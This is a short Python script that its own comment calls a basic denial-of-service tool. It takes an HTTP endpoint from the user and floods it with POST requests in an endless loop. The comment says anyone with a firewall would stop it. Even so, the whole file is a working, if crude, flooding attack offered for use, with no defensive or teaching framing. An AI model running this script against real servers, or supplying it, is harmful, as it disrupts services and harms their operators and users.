# An extremely basic denial of service script that wont work on anyone who knows what a firewall is


import requests
data = 'hi'
endpoint = input('Enter http endpoint')
if not endpoint.startswith('http'):
    endpoint = 'http://' + endpoint
try:
    requests.post(endpoint, data=data)
except:
    endpoint = 'http://127.0.0.1:80'

while 1:
    requests.post(endpoint, data=data)
